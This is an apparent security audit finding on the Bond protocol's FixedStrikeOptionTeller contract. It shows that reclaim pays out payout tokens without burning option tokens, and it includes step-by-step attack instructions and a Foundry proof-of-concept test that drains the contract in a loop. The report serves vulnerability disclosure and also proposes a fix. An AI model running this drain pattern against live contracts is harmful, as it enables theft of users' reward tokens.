| Severity | Title | 
|:--:|:---|
| [H-01](#h-01-users-can-steal-all-claimed-but-not-exercised-reward-token) | Users can steal all claimed, but not exercised reward token |




# [H-01] Users can steal all claimed, but not exercised reward token

## Summary
Any user can steal all of the payout tokens that **are claimed** in `OTLM`, but **not exercised** in `FixedStrikeOptionTeller`
## Vulnerability Detail
For this to happen the attacker needs to set up and copy some parts, so lets begin:

- **1** A normal provider sets up  [`OTLM`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/liquidity-mining/OTLM.sol) for users to mine rewards and provide liquidity. 
- **2** The attacker calls the [`deploy`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L107-L191) function in [`FixedStrikeOptionTeller`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol) with the same payout token used by the provider, creating an opToken for themselves. 
```jsx
    function deploy(
        ERC20 payoutToken_,//copy his token
        ERC20 quoteToken_,//does not matter
        uint48 eligible_,// 0 to trigger with block.timestamp
        uint48 expiry_,// just above minOptionDuration => 1 day
        address receiver_,//your address
        bool call_,//true
        uint256 strikePrice_//does not matter
    );
```
- **3** The attacker calls the [`create`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol) function and sends 100e18 of the payout tokens to the contract, allowing FixedStrikeOptionTeller to mint 100e18 opTokens for himself.

- **4** The attacker waits for the expiry timestamp of their opToken to pass and calls [`reclaim`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L395-L437) , passing their opToken.

`reclaim`, will check if your token [is registered](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L398C1-L420) in `FixedStrikeOptionTeller`, and if you are the [`receiver`](https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L426). Afterwards it gets the `totalSupply`, of your opToken (we minted 100e18 with `create`, in step 3) and it send this amount to you, **without burning the opTokens**. Now you can call this function as many times as there are tokens in this contract and take them all.

```jsx
        //totalSupply == 100e18
        uint256 amount = optionToken.totalSupply();
        if (call) {
            //@audit just transfer the tokens without burning or any other checks???
            payoutToken.safeTransfer(receiver, amount);
        } 
```
## Impact
User can steal any or all of **claimed**, but **not exercised** reward token
## Code Snippet
https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L395-L437

## PoC:
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {MockERC20, ERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {MockBondOracle} from "test/mocks/MockBondOracle.sol";
import {RolesAuthority, Authority} from "solmate/auth/authorities/RolesAuthority.sol";

import {TokenAllowlist, IAllowlist, ITokenBalance} from "src/periphery/TokenAllowlist.sol";
import {FixedStrikeOptionTeller, FixedStrikeOptionToken, FullMath} from "src/fixed-strike/FixedStrikeOptionTeller.sol";
import {OTLMFactory, ManualStrikeOTLM, OracleStrikeOTLM} from "src/fixed-strike/liquidity-mining/OTLMFactory.sol";

contract FixedStrikeOTLMTest is Test {
    using FullMath for uint256;

    address public guardian;
    address public user1;
    address public user2;
    address public user3;

    MockERC20 public reward;
    MockERC20 public ghi;

    RolesAuthority public auth;
    FixedStrikeOptionTeller public teller;
    OTLMFactory public otlmFactory;
    ManualStrikeOTLM public motlm;
    OracleStrikeOTLM public ootlm;
    MockBondOracle public oracle;
    TokenAllowlist public allowlist;

    bytes public constant ZERO_BYTES = bytes("");
    MockERC20 pToken;
    MockERC20 qToken;
    MockERC20 stakeToken;

    function setUp() public {
        pToken = new MockERC20("payoutToken", "payoutToken", 18);
        qToken = new MockERC20("quoteToken", "quoteToken", 18);
        stakeToken = new MockERC20("stakeToken", "stakeToken", 18);
        vm.warp((52 * 365 + (52 - 2) / 4) * 24 * 60 * 60 + 12 hours);
        vm.label(address(pToken), "pToken");
        vm.label(address(qToken), "qToken");
        vm.label(address(stakeToken), "stakeToken");

        guardian = address(0x3b);
        user1 = address(111);
        user2 = address(222);
        user3 = address(333);
        vm.label(user1, "user1");
        vm.label(user2, "user2");
        vm.label(user3, "user3");

        // Deploy contracts
        auth = new RolesAuthority(address(this), Authority(address(0)));
        teller = new FixedStrikeOptionTeller(guardian, auth);
        otlmFactory = new OTLMFactory(teller);

        stakeToken = new MockERC20("stakeToken", "stakeToken", 18);
        reward = new MockERC20("reward", "reward", 18);
        ghi = new MockERC20("GHI", "GHI", 18);

        vm.label(address(stakeToken), "StakeToken");
        vm.label(address(reward), "RewardToken");
        vm.label(address(ghi), "ghi");

        auth.setRoleCapability(uint8(0), address(teller), teller.setProtocolFee.selector, true);
        auth.setRoleCapability(uint8(0), address(teller), teller.claimFees.selector, true);
        auth.setUserRole(guardian, uint8(0), true);

        vm.prank(guardian);
        teller.setProtocolFee(uint48(500));

        pToken.mint(user1, 1e24);
    }

    function _OTLM() internal {
        vm.prank(user1);
        motlm = ManualStrikeOTLM(
            address(otlmFactory.deploy(stakeToken, pToken, OTLMFactory.Style.ManualStrike))
        );

        vm.prank(user1);
        motlm.initialize(
            qToken,
            uint48(1 days),
            uint48(14 days),
            user1,
            uint48(7 days),
            1e18,
            1000e18,
            IAllowlist(address(0)),
            abi.encode(0),
            abi.encode(5 * 1e18)
        );

        vm.prank(user1);
        pToken.transfer(address(motlm), 1e24);
    }

    function test_Reclaim_Vuln() public {
        stakeToken.mint(user2, 1000e18);
        pToken.mint(user3, 100e18);
        _OTLM();

        vm.startPrank(user2);

        stakeToken.approve(address(motlm), type(uint256).max);

        motlm.stake(1e18, ZERO_BYTES);
        vm.stopPrank();

        skip(1 days);

        vm.prank(user2);
        motlm.claimRewards();
        uint48 epoch = motlm.epoch();
        FixedStrikeOptionToken opToken = motlm.epochOptionTokens(epoch);
        console.log("user2 opToken balance: ", opToken.balanceOf(user2) / 1e18);

        vm.startPrank(user3);
        pToken.approve(address(teller), type(uint256).max);
        FixedStrikeOptionToken attackerOpToken = teller.deploy(
            pToken,
            qToken,
            0,
            uint48(teller.minOptionDuration() + block.timestamp),
            user3,
            true,
            1e18
        );
        uint stealAmount = 100e18;
        teller.create(attackerOpToken, stealAmount);

        skip(2 days);

        while (pToken.balanceOf(address(teller)) >= stealAmount) {
            teller.reclaim(attackerOpToken);
        }

        console.log("Attacker payout token balance: ", pToken.balanceOf(user3) / 1e18);
    }
}
```

## Tool used

Manual Review

## Recommendation
You can either burn the tokens or implement a system that maps the payout tokens with opTokens. 